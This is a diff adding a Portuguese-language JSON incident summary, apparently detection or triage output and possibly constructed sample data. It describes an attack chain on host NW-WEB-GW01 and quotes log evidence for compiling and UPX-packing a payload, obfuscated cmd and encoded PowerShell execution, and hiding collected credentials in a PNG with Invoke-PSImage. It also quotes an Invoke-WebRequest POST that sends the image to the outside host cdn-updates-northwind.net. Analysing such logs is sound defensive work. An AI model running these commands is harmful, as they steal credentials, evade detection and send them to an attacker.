@@ -1,0 +1,18 @@
+{
+  "resumo_comportamental": "No host NW-WEB-GW01 observa-se uma cadeia de ataque completa: um binário malicioso é compilado a partir de código-fonte via csc.exe (Command Line: csc.exe /out:C:\\Windows\\Temp\\finalstage.exe C:\\Windows\\Temp\\finalstage.cs, Event ID 4688), depois empacotado/ofuscado com upx.exe --best --lzma, gerando finalstage_packed.exe com hash alterado em relação ao binário original (Sysmon Event ID 11). O binário é executado através de um comando cmd.exe ofuscado (echo %COMSPEC:~0,1%%COMSPEC:~11,1% & C:\\Windows\\Temp\\finalstage_packed.exe) e de um Scriptblock powershell.exe -EncodedCommand em Base64 (Event ID 4104) que roda Start-Process -FilePath C:\\Windows\\Temp\\finalstage_packed.exe, criando o processo finalstage_packed.exe a partir de powershell.exe (Event ID 4688). Em seguida há coleta e exfiltração de credenciais via esteganografia: o comando Invoke-PSImage -Script C:\\Windows\\Temp\\collected_creds.ps1 -Image C:\\Windows\\Temp\\wallpaper_northwind.png -Out C:\\Windows\\Temp\\wallpaper_out.png (Event ID 4104) produz um arquivo de imagem de tamanho anômalo (4.8MB, Sysmon Event ID 11), enviado por powershell.exe via Invoke-WebRequest -Uri http://cdn-updates-northwind.net/upload -Method POST -InFile C:\\Windows\\Temp\\wallpaper_out.png (Event ID 4688), confirmado com sucesso (status 200) pelo Event ID 4103.",
+  "entidades_identificadas": [
+    "NW-WEB-GW01",
+    "csc.exe",
+    "upx.exe",
+    "cmd.exe",
+    "powershell.exe",
+    "finalstage.exe",
+    "finalstage.cs",
+    "finalstage_packed.exe",
+    "collected_creds.ps1",
+    "wallpaper_northwind.png",
+    "wallpaper_out.png",
+    "cdn-updates-northwind.net"
+  ],
+  "severidade_maxima": "critical"
+}
